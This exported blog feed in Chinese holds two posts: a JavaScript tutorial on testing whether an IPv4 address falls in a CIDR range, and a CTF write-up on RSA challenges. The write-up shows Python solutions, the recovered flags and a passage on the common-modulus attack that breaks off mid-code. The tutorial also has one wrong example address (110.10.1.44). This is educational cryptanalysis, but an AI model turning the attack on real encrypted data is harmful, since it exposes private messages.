    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在项目过程中，曾遇到<strong>根据 IP 地址判断 CIDR 网络区域、并且在前端展示</strong>的需求。由于 Javascript 没有原生类库能对 IP 地址进行相关操作，因此本文将采用 ES6 的新特性<strong>箭头函数</strong>，精简地实现此判断功能。</p>
<span id="more"></span>

<h1 id="0x01-基础概念"><a href="#0x01-基础概念" class="headerlink" title="0x01 基础概念"></a>0x01 基础概念</h1><h2 id="什么是-CIDR？"><a href="#什么是-CIDR？" class="headerlink" title="什么是 CIDR？"></a>什么是 CIDR？</h2><p><strong><a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">CIDR</a>（Classless Inter-Domain Routing，无类别域间路由）</strong>是一种 IP 地址归类方法，主要用于分配 IP 地址与有效地路由 IP 数据包等功能。</p>
<p>CIDR 的表示方法为 <code>A.B.C.D/N</code>，其中 <code>A.B.C.D</code> 是点分十进制的 IPv4 地址，<code>N</code> 是 0 至 32 之间的整数，代表 CIDR 的前缀长度，两者用斜线 <code>/</code> 分隔。</p>
<p>若一个 IP 地址的前 <code>N</code> 位与 一个 CIDR 范围的前缀相同，则说明此 IP 地址在此 CIDR 范围中。以 CIDR 范围 <code>10.10.1.32/27</code> 为例，可知 <code>110.10.1.44</code> 属于该 CIDR 范围，而 <code>10.10.1.90</code> 则不属于。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/check-if-ip-belongs-to-cidr-by-javascript/cidr-comparison.png" alt="cidr-comparison"></p>
<h2 id="什么是箭头函数？"><a href="#什么是箭头函数？" class="headerlink" title="什么是箭头函数？"></a>什么是箭头函数？</h2><p><strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions">箭头函数</a>表达式</strong>是 ECMAScript 6 的新增语法，相比于普通函数表达式，它主要特点是具有更精简的表达语法，以及在函数体内不存在自己的 <code>this</code>、<code>arguments</code>、<code>super</code>、<code>new.target</code> 等变量。</p>
<p>以下变量 <code>a</code> 与 <code>b</code> 均可定义了一个平方数计算函数，可见 <code>a</code> 比 <code>b</code> 的定义更精简：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = x =&gt; x * x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">const</span> b = <span class="keyword">function</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">a</span>(<span class="number">2</span>); <span class="comment">// 4</span></span><br><span class="line"><span class="title function_">b</span>(<span class="number">2</span>); <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>

<p>箭头函数的特点及用法，请参考 0x03 中的相关教程，此处不再详解。</p>
<h1 id="0x02-函数实现"><a href="#0x02-函数实现" class="headerlink" title="0x02 函数实现"></a>0x02 函数实现</h1><h2 id="validateIp4"><a href="#validateIp4" class="headerlink" title="validateIp4"></a>validateIp4</h2><p><code>validateIp4</code> 用于判断 IPv4 地址的合法性。需要满足以下三个要求：</p>
<ul>
<li>由三个 <code>.</code> 符号分隔四部分整数</li>
<li>每部分整数范围是 0 至 255</li>
<li>每部分整数不能有前导 0</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">validateIp4</span> = ip =&gt;</span><br><span class="line">	<span class="regexp">/^((\d|[1-9]\d|1\d\d|2([0-4]\d|5[0-5]))(\.|$))&#123;4&#125;$/</span>.<span class="title function_">test</span>(ip) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">validateIp4</span>(<span class="string">&quot;192.168.1.1&quot;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="title function_">validateIp4</span>(<span class="string">&quot;192.168.1&quot;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title function_">validateIp4</span>(<span class="string">&quot;192.168.1.1000&quot;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title function_">validateIp4</span>(<span class="string">&quot;192.168.1.01&quot;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>此函数通过正则表达式实现，其中：</p>
<ul>
<li><code>(\d|[1-9]\d|1\d\d|2([0-4]\d|5[0-5]))</code> 限定每部分整数取值只能为 0 至 9、10 至 99、100 至 255</li>
<li><code>(\.|$)</code> 限定每部分结尾只能是 <code>.</code> 符号或行尾</li>
</ul>
<h2 id="validateCidr"><a href="#validateCidr" class="headerlink" title="validateCidr"></a>validateCidr</h2><p><code>validateCidr</code> 用于判断 CIDR 范围的合法性。除了 IPv4 部分需要满足上述三个要求，前缀长度还需满足：</p>
<ul>
<li>长度范围是 0 至 32</li>
<li>长度不能有前导 0</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">validateCidr</span> = cidr =&gt;</span><br><span class="line">	<span class="regexp">/^((\d|[1-9]\d|1\d\d|2([0-4]\d|5[0-5]))\.)&#123;3&#125;((\d|[1-9]\d|1\d\d|2([0-4]\d|5[0-5]))\/)&#123;1&#125;(\d|[1-3]\d)$/</span>.<span class="title function_">test</span>(cidr) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">validateCidr</span>(<span class="string">&quot;192.168.1.1/24&quot;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="title function_">validateCidr</span>(<span class="string">&quot;192.168.1.1&quot;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title function_">validateCidr</span>(<span class="string">&quot;192.168.1/24&quot;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title function_">validateCidr</span>(<span class="string">&quot;192.168.1.1/48&quot;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title function_">validateCidr</span>(<span class="string">&quot;192.168.1/024&quot;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>由于 IPv4 地址最后一部分不再匹配行尾，因此正则表达式拆分成两部分：IPv4 地址前三部分末尾匹配 <code>.</code> 符号，最后一部分末尾匹配 <code>/</code> 符号。此外，<code>(\d|[1-3]\d)</code> 限定前缀范围为 0 至 32。</p>
<h2 id="ip4ToInt"><a href="#ip4ToInt" class="headerlink" title="ip4ToInt"></a>ip4ToInt</h2><p><code>ip4ToInt</code> 用于计算 IPv4 地址每部分整数的移位累加和。可以理解为，在去除 <code>.</code> 符号后，得到从左至右排列的 32 位二进制整数，再将其转换为十进制整数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ip4ToInt</span> = ip =&gt;</span><br><span class="line">	ip.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, part</span>) =&gt;</span> (sum &lt;&lt; <span class="number">8</span>) + <span class="built_in">parseInt</span>(part, <span class="number">10</span>), <span class="number">0</span>) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">ip4ToInt</span>(<span class="string">&quot;192.168.1.1&quot;</span>) <span class="comment">// 3232235777</span></span><br><span class="line"><span class="title function_">ip4ToInt</span>(<span class="string">&quot;192.168.1&quot;</span>) <span class="comment">// 12625921</span></span><br><span class="line"><span class="title function_">ip4ToInt</span>(<span class="string">&quot;192.168.1.1000&quot;</span>) <span class="comment">// 3232236776</span></span><br><span class="line"><span class="title function_">ip4ToInt</span>(<span class="string">&quot;192.168.1.01&quot;</span>) <span class="comment">// 3232235777</span></span><br></pre></td></tr></table></figure>

<p>由测试结果可见，函数暂未做 IPv4 地址合法性判断，适用于任何点分数字字符串，其中：</p>
<ul>
<li><code>split(&#39;.&#39;)</code> 将 IPv4 地址的每部分取出，例如 <code>&quot;192.168.1.1&quot;.split(&#39;.&#39;)</code> 将得到 <code>[&quot;192&quot;, &quot;168&quot;, &quot;1&quot;, &quot;1&quot;]</code></li>
<li><code>reduce((sum, part) =&gt; (sum &lt;&lt; 8) + parseInt(part, 10), 0)</code> 将计算每个数组元素的移位累加和，详细用法请参考：<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce">Array.prototype.reduce()</a><ul>
<li><code>sum</code> 为累加和，作为 <code>reduce</code> 函数的结果返回，初始值设置为 0</li>
<li><code>part</code> 为每个数组元素，转换为十进制整数后，与左移 8 位后的 <code>sum</code> 相加</li>
</ul>
</li>
<li><code>&gt;&gt;&gt; 0 </code> 将计算结果转换为 32 位无符号整数，详细含义请参考：<a href="https://stackoverflow.com/questions/1822350/what-is-the-javascript-operator-and-how-do-you-use-it">What is the JavaScript &gt;&gt;&gt; operator and how do you use it?</a></li>
</ul>
<h2 id="isIp4InCidr"><a href="#isIp4InCidr" class="headerlink" title="isIp4InCidr"></a>isIp4InCidr</h2><p><code>isIp4InCidr</code> 用于判断 IPv4 地址是否属于 CIDR 范围。函数中嵌套了子函数，<code>isIp4InCidr(ip)</code> 返回一个以 <code>cidr</code> 作为参数的函数，便于后续对多个 CIDR 范围进行判断。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isIp4InCidr</span> = ip =&gt; <span class="function"><span class="params">cidr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">validateIp4</span>(ip) &amp;&amp; <span class="title function_">validateCidr</span>(cidr)) &#123;</span><br><span class="line">        <span class="keyword">const</span> [range, bits] = cidr.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> mask = ~(<span class="number">2</span> ** (<span class="number">32</span> - bits) - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="title function_">ip4ToInt</span>(ip) &amp; mask) === (<span class="title function_">ip4ToInt</span>(range) &amp; mask);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">isIp4InCidr</span>(<span class="string">&quot;192.168.1.1&quot;</span>)(<span class="string">&quot;192.168.1.1/24&quot;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="title function_">isIp4InCidr</span>(<span class="string">&quot;192.168.1.1&quot;</span>)(<span class="string">&quot;192.168.1.1/48&quot;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title function_">isIp4InCidr</span>(<span class="string">&quot;192.168.1&quot;</span>)(<span class="string">&quot;192.168.1.1/24&quot;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>若 IPv4 地址与 CIDR 范围均合法，则继续进行判断，否则返回 <code>false</code>，其中：</p>
<ul>
<li><code>[range, bits] = cidr.split(&#39;/&#39;)</code> 使用了 ES6 的新特性<a href="http://es6.ruanyifeng.com/#docs/destructuring">解构赋值</a>，<code>range</code> 为 CIDR 范围的 IPv4 部分，<code>bits</code> 为前缀长度部分</li>
<li><code>mask = ~(2 ** (32 - bits) - 1)</code> 根据前缀长度计算掩码，掩码的前 <code>bits</code> 位为 <code>1</code>，后 <code>32 - bits</code> 位为 <code>0</code></li>
<li>若 <code>ip</code> 与 <code>range</code> 的前 <code>bits</code> 位相同，则返回 <code>true</code>，否则返回 <code>false</code></li>
</ul>
<h2 id="isIp4InCidrs"><a href="#isIp4InCidrs" class="headerlink" title="isIp4InCidrs"></a>isIp4InCidrs</h2><p><code>isIp4InCidrs</code> 用于判断 IPv4 地址是否属于 CIDR 数组内的其中一个范围。函数基于 <code>isIp4InCidr</code>  实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isIp4InCidrs</span> = (<span class="params">ip, cidrs</span>) =&gt; cidrs.<span class="title function_">some</span>(<span class="title function_">isIp4InCidr</span>(ip));</span><br><span class="line"></span><br><span class="line"><span class="title function_">isIp4InCidrs</span>(<span class="string">&#x27;192.168.10.1&#x27;</span>, [<span class="string">&#x27;10.10.0.0/16&#x27;</span>, <span class="string">&#x27;192.168.1.1/24&#x27;</span>]); <span class="comment">// false</span></span><br><span class="line"><span class="title function_">isIp4InCidrs</span>(<span class="string">&#x27;192.168.10.1&#x27;</span>, [<span class="string">&#x27;10.10.0.0/16&#x27;</span>, <span class="string">&#x27;192.168.1.1/16&#x27;</span>]); <span class="comment">// true</span></span><br><span class="line"><span class="title function_">isIp4InCidrs</span>(<span class="string">&#x27;10.10.10.10&#x27;</span>, [<span class="string">&#x27;10.10.0.0/48&#x27;</span>, <span class="string">&#x27;10.10.0.0/16&#x27;</span>]); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>若 IPv4 地址属于CIDR 数组内的其中一个范围，则返回 <code>true</code>，结束判断，否则返回 <code>false</code>，其中：</p>
<ul>
<li><code>some(isIp4InCidr(ip))</code> 将判断 CIDR 数组中，是否至少有一个元素满足 <code>isIp4InCidr(ip)</code> 为真，即 IPv4 地址属于某个 CIDR 范围，详细用法请参考：<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Some">Array.prototype.some()</a></li>
</ul>
<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>本文主要是利用 ECMAScript 6 的新特性与 Array 对象的方法，精简地实现了 IPv4 地址是否属于某个 CIDR 范围的判断功能，文中不足或错误之处，恳请读者告知。</p>
<p>对功能实现与箭头函数有疑惑的读者，可参考以下文章：</p>
<p><a href="https://tech.mybuilder.com/determining-if-an-ipv4-address-is-within-a-cidr-range-in-javascript/">Determining if an IPv4 address is within a CIDR range in JavaScript</a><br><a href="https://hacks.mozilla.org/2015/06/es6-in-depth-arrow-functions/">ES6 In Depth: Arrow functions</a><br><a href="http://es6.ruanyifeng.com/#docs/function">ECMAScript 6 入门教程——函数的扩展</a></p>
]]></content>
      <categories>
        <category>Programming</category>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
        <tag>ECMAScript</tag>
        <tag>Network</tag>
        <tag>RegEx</tag>
      </tags>
  </entry>
  <entry>
    <title>【CNSS 2017】 Crypto —— RSA Combo</title>
    <url>/2017/10/27/cnss-2017-crypto-rsa-combo/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本次 <a href="https://ctf.cnssuestc.org/">UESTC CNSS Recruit 2017</a> 中，Crypto 方面的题推出了 RSA 套餐，涉及 <strong>RSA 加密算法原理</strong>与<strong>特定情况下对 RSA 的密码攻击</strong>，对密码学初学者是个很好的练习机会，在此感谢出题人 <a href="http://blog.chrstm.com/">JHSN</a> 和 <a href="http://xr1s.me/">xris</a> 。</p>
<span id="more"></span>

<p>此 RSA 套餐一共四题，前两题涉及 RSA 加密算法原理，后两题涉及 RSA 密码攻击。</p>
<p>RSA 公钥密码体制于 1977 年由 Ron Rivest、Adi Shamir、Leonard Adleman 一起提出，并以三人的姓氏首字母拼接命名，现已成为公钥密码的国际标准，是目前应用最广泛的公钥密码体制之一。RSA 是基于大整数因子分解问题的公钥密码，因此阅读本文需要有<strong>数论</strong>基础，并且所有代码选用 <strong>Python</strong>，便于大整数运算。</p>
<p>下面先介绍 RSA 加解密算法的过程，需要用到的几个数论知识，请读者自行学习理解。</p>
<h2 id="RSA-密钥对的生成"><a href="#RSA-密钥对的生成" class="headerlink" title="RSA 密钥对的生成"></a>RSA 密钥对的生成</h2><p>RSA 公私密钥对的生成，由以下四个步骤完成：</p>
<ol>
<li>选取两个<strong>大素数</strong> $p$ 和 $q$ （目前安全标准要求 $p$、$q$ 长度相差不能太大，且至少有 $512 bits$；</li>
<li>计算乘积 $n &#x3D; p \times q$ 和 $\varphi\left(n\right) &#x3D; \left(p-1\right)\left(q-1\right)$，其中 $\varphi\left(n\right)$ 是<strong>欧拉函数</strong>；</li>
<li>随机选取整数 $e$ 作为公钥，$1 &lt; e &lt; \varphi\left(n\right)$，并且要求 $gcd\left(e,\varphi\left(n\right)\right) &#x3D; 1$，即 $e$ 与 $\varphi\left(n\right)$ 互素，<strong>最大公约数</strong>为 $1$；</li>
<li>用<strong>扩展欧几里得算法</strong>计算私钥 $d$，满足 $d \times e \equiv 1 \ mod \ \varphi\left(n\right)$，即 $d \equiv e^{-1} \ mod \ \varphi\left(n\right)$，称 $d$ 是 $e$ 在模 $\varphi\left(n\right)$ 下的<strong>乘法逆元</strong>。</li>
</ol>
<p>此时得到公钥 $\left(e,n\right)$ 与 私钥 $d$。应注意，用户需要公开公钥 $\left(e,n\right)$，而只需保留私钥 $d$，两个大素数 $p$ 和 $q$ 已不再需要，最好销毁，但千万不能泄露。</p>
<h2 id="RSA-加密算法"><a href="#RSA-加密算法" class="headerlink" title="RSA 加密算法"></a>RSA 加密算法</h2><p>加密时首先将明文消息字符串转换为二进制编码，用十六进制表示，然后将明文比特串分组，每个分组的十进制数必须小于 $n$，即每个分组的比特数不大于 $\log_2 n $，最后对每个明文分组进行加密运算，过程如下：</p>
<ol>
<li>获得接收方的公钥 $\left(e,n\right)$；</li>
<li>将明文 $M$ 划分为 $N$ 个明文分组 $M &#x3D; m_1m_2 \cdots m_N$，其中每个分组长度为 $L$（$L &lt; \log_2 n$）；</li>
<li>对明文分组进行加密运算，每个分组对应的密文为 $c_i &#x3D; {m_i}^{e} \ mod \ n$，其中 $1 \le i \le N$，加密后得密文分组 $C &#x3D; c_1c_2 \cdots c_N$；</li>
<li>将密文 $C$ 发送给接收方。</li>
</ol>
<h2 id="RSA-解密算法"><a href="#RSA-解密算法" class="headerlink" title="RSA 解密算法"></a>RSA 解密算法</h2><p>解密时首先将密文比特串恢复成明文比特串，再对其进行相应的字符编码，即可得到明文消息，过程如下：</p>
<ol>
<li>接收方收到密文 $C$ 后，先按照分组长度 $L$ 进行划分，得密文分组 $C &#x3D; c_1c_2 \cdots c_N$；</li>
<li>使用私钥 $d$，对密文分组进行解密运算，每个分组对应的明文为 $m_i &#x3D; {c_i}^{d} \ mod \ n$，其中 $1 \le i \le N$，解密后得明文分组 $M &#x3D; m_1m_2 \cdots m_N$。</li>
</ol>
<p>以上就是 RSA 加密算法的基本原理，涉及到的数论知识已加粗标识，基本部分没掌握好的请自行查阅资料学习。</p>
<p>下面进入正题，借助 <strong>Python 2.7</strong> 来对 RSA 加解密过程的大整数进行运算，要用到模块 <a href="https://pypi.python.org/pypi/gmpy2">gmpy2</a> 进行大整数运算，使用文档请见 <a href="http://gmpy2.readthedocs.io/en/latest/">http://gmpy2.readthedocs.io/en/latest/</a>，以及模块 <a href="https://docs.python.org/2/library/binascii.html">binascii</a>，将 ASCII 码十六进制字符串还原成明文。</p>
<p><strong>注意：由于以下四题的明文量较小，均有 $m &lt; p \times q &#x3D; n$，因此明密文不涉及分组过程。</strong></p>
<h1 id="0x01-Easy-RSA"><a href="#0x01-Easy-RSA" class="headerlink" title="0x01 Easy RSA"></a>0x01 Easy RSA</h1><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/cnss-2017-crypto-rsa-combo/easy-rsa.png" alt="easy-rsa"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p: 0xddb9fe428c938abdce551751b299feed367c97b52b17062d</span><br><span class="line">q: 0x265ad78c77eab2c5ab9b69fb44a11624818bed56c003d2c5e6d29f7</span><br><span class="line">e: 0x1fffffffffffffff</span><br><span class="line">d: 0x9737352a92d198aaeddb8db9cc5cb81a788aa7d0ec0ec9bac7f6ffece7ff928c8db6a47656dffb0421ef9ca595665b6b55d35f</span><br><span class="line">c: 0x1c0aa41505131e967d3db09227ef9572337a5e79f07484428efd6262eddee2fb67b6e6e6b5506871891ece1949eabf7a03cafdb</span><br></pre></td></tr></table></figure>

<p>根据题意，已知 $p、q、e、d、c$，求 $m$。此题属于 RSA 加密算法基础题，思路也容易想到，直接求 $m &#x3D; c^d \ mod \ n$ 即可得到明文，且 $n &#x3D; p \times q$。下面给出 Python 解题代码，代码中的函数使用方法请自行查阅相应模块的使用手册。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = gmpy2.mpz(<span class="number">0xddb9fe428c938abdce551751b299feed367c97b52b17062d</span>)</span><br><span class="line">q = gmpy2.mpz(<span class="number">0x265ad78c77eab2c5ab9b69fb44a11624818bed56c003d2c5e6d29f7</span>)</span><br><span class="line">d = gmpy2.mpz(<span class="number">0x9737352a92d198aaeddb8db9cc5cb81a788aa7d0ec0ec9bac7f6ffece7ff928c8db6a47656dffb0421ef9ca595665b6b55d35f</span>)</span><br><span class="line">c = gmpy2.mpz(<span class="number">0x1c0aa41505131e967d3db09227ef9572337a5e79f07484428efd6262eddee2fb67b6e6e6b5506871891ece1949eabf7a03cafdb</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, p*q))  <span class="comment"># Figure out c^d modulo n, then change to hex. Note that n = p * q.</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;plaintext:&quot;</span>, m</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>, binascii.a2b_hex(<span class="built_in">str</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>代码执行后，打印明文的十六进制数值，以及对应的 ASCII 字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext: 0x636e73737b555f6d7573745f6b6e30775f41534331315f616e645f5235617d</span><br><span class="line">flag: cnss&#123;U_must_kn0w_ASC11_and_R5a&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-RSA-Cool"><a href="#0x02-RSA-Cool" class="headerlink" title="0x02 RSA Cool"></a>0x02 RSA Cool</h1><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/cnss-2017-crypto-rsa-combo/rsa-cool.png" alt="easy-rsa"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p: 0xf5621a5fd44994f720c1b971fea84f63</span><br><span class="line">q: 0xdfb85e3d22c0b59271884df021a57123</span><br><span class="line">e: 0xf36698ed9d9fedd7</span><br><span class="line">c: 0x448040a0a4757a630c4d8401fb3c0518ab0bce9a02085329536244c91727775c</span><br></pre></td></tr></table></figure>
<p>根据所给数据，本题是已知 $p、q、e、c$，求 $m$，与第一题相比少给了私钥 $d$。此题也属于 RSA 加密算法基础题，在第一题的基础上先求出私钥 $d$，再求 $m &#x3D; c^d \ mod \ n$ 即可得到明文。下面给出 Python 解题代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = gmpy2.mpz(<span class="number">0xf5621a5fd44994f720c1b971fea84f63</span>)</span><br><span class="line">q = gmpy2.mpz(<span class="number">0xdfb85e3d22c0b59271884df021a57123</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">0xf36698ed9d9fedd7</span>)</span><br><span class="line">c = gmpy2.mpz(<span class="number">0x448040a0a4757a630c4d8401fb3c0518ab0bce9a02085329536244c91727775c</span>)</span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># Figure out the multiplicative inverse of e modulo phi_n (i.e. the private key). </span></span><br><span class="line">m = <span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, p*q))  <span class="comment"># Figure out c^d modulo n, then change to hex. Note that n = p * q.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;private key:&quot;</span>, <span class="built_in">hex</span>(d)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;plaintext:&quot;</span>, m</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>, binascii.a2b_hex(<span class="built_in">str</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>代码执行后，打印私钥、明文的十六进制数值，以及对应的 ASCII 字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private key: 0x93f984ff1d6333df9c43c135c3098a83d27516f5cf32f9475171fe31da5c7edb</span><br><span class="line">plaintext: 0x636e73737b5269763373745f5368616d31725f34646c656d616e7d</span><br><span class="line">flag: cnss&#123;Riv3st_Sham1r_4dleman&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-RSA-Cooler"><a href="#0x03-RSA-Cooler" class="headerlink" title="0x03 RSA Cooler"></a>0x03 RSA Cooler</h1><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/cnss-2017-crypto-rsa-combo/rsa-cooler.png" alt="easy-rsa"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public key 1:</span><br><span class="line">n = 0x9ff2e873e1fcafbed22341b4eafdae01afec540e4e84e6041b0a0e83253f1c5da5dabc73004faa82cfaff8e83e5a99255f9790a7744dd18a694d09a89a5caf638d0cf4fe1150a9e894d47a17f386c107a083ae227efab851196de992a2441b7af3442f31a757234ef8997d8af1a3c3aecf2b6100d393a7b632913c2b1c921409</span><br><span class="line">e = 0xe9a44960483b5ca224cfd18818944eaae47de3a158debbc7886b74d7e11165e2e4158c86add4ccc5317256e5323596c9947513766645aefdac4f0375a0296743</span><br><span class="line"></span><br><span class="line">encrypted message 1:</span><br><span class="line">c = 0x636f86fb2b1991d4788092563adf87d14b975e9c7ab7279b10f4741f515788bba2e6e788d6f6c165f4daf65eabee93cebfc55a1d651b1dfb1190174ab338d959775658cf1c6d42b0fe6b7b1abaf5a9aa4ca239367bfcbe88b304c99d5e5f8aac019ec74b11662a5deba523c2f93b7c68a731c019578e3ac64db64cfd3533e91b</span><br><span class="line"></span><br><span class="line">public key 2:</span><br><span class="line">n = 0x9ff2e873e1fcafbed22341b4eafdae01afec540e4e84e6041b0a0e83253f1c5da5dabc73004faa82cfaff8e83e5a99255f9790a7744dd18a694d09a89a5caf638d0cf4fe1150a9e894d47a17f386c107a083ae227efab851196de992a2441b7af3442f31a757234ef8997d8af1a3c3aecf2b6100d393a7b632913c2b1c921409</span><br><span class="line">e = 0xd9b47cdd777deb3e94cfa3d416aa91b04f9391af0504a83de03e9e0c49faae8b79cf7c99f575af99ed2e9e5a7edb09219c4f79cf961092f9919ab33bc3c9a74f</span><br><span class="line"></span><br><span class="line">encrypted message 2:</span><br><span class="line">c = 0x53b601daa8f93166495a69fa747f8553bb8317cfe6dc3f7fec8c8511e209f9288038405fdee399f3ed68ab25dcd91be8bb2ef2ecac1173318b5d2bba932afdcab2d4e5b46987a0f774a29204ce481f79ea422943118f2eaf6c6820b501d9da8d3fbbcea464a2d158a39de6bae6ab845555e4646ae556d7b1e00567b00d41b06c</span><br></pre></td></tr></table></figure>

<p>根据所给数据，可看出本题是已知两组 $n、e、c$，求 $m$，且两组中的模数 $n$ 相等。</p>
<p>换言之，就是已知两个都在模 $n$ 下的公钥，记为 $e_1、e_2$，以及相应的密文 $c_1、c_2$，看你能不能恢复出明文？即使学过 RSA，如果数学基础不够扎实，也很难想出解法的。翻阅了几本密码学教材，发现这种在特定场景下的 RSA 密码攻击，大名为<strong>共模攻击</strong>。</p>
<h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p><strong>共模攻击</strong>，是指在 RSA 加密算法的实际使用中，有时为了方便起见，给每个用户设置相同的模数 $n$，仅用不同的公钥 $e$ 来区分不同用户。在这种场景下，若攻击者截获了分别用不同公钥 $e_1、e_2$ 加密相同明文 $m$ 后的密文 $c_1、c_2$，则能够在不知道用户私钥 $d_1、d_2$ 的情况下，恢复出明文 $m$。</p>
<p>假设两个用户的公钥分别为 $e_1、e_2$，且 $e_1$ 与 $e_2$ 互素，模数为 $n$，明文为 $m$，密文分别为 $c_1 \equiv m^{e_1} \ mod \ n 、 c_2 \equiv m^{e_2} \ mod \ n$。攻击者截获 $c_1、c_2$ 后，可通过<strong>扩展欧几里得算法</strong>，求出满足等式 $xe_1 + ye_2 &#x3D; 1$ 的两个整数 $x$ 和 $y$，其中 $x$ 是 $e_1$ 在模 $e_2$ 下的<strong>乘法逆元</strong>，$y$ 是 $e_2$ 在模 $e_1$ 下的<strong>乘法逆元</strong>，由此计算 ${c_1}^x{c_2}^y \equiv m^{xe_1}m^{ye_2} \equiv m^{\left(xe_1+ye_2\right)} \equiv m \ mod \ n$ 即可得到明文 $m$。下面给出 Python 解题代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extended Euclid Algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extendedGCD</span>(<span class="params">a, b</span>):  </span><br><span class="line">    <span class="comment"># a*xi + b*yi = ri</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    <span class="comment"># a*x1 + b*y1 = a</span></span><br><span class="line">    x1 = <span class="number">1</span></span><br><span class="line">    y1 = <span class="number">0</span></span><br><span class="line">    <span class="comment"># a*x2 + b*y2 = b</span></span><br><span class="line">    x2 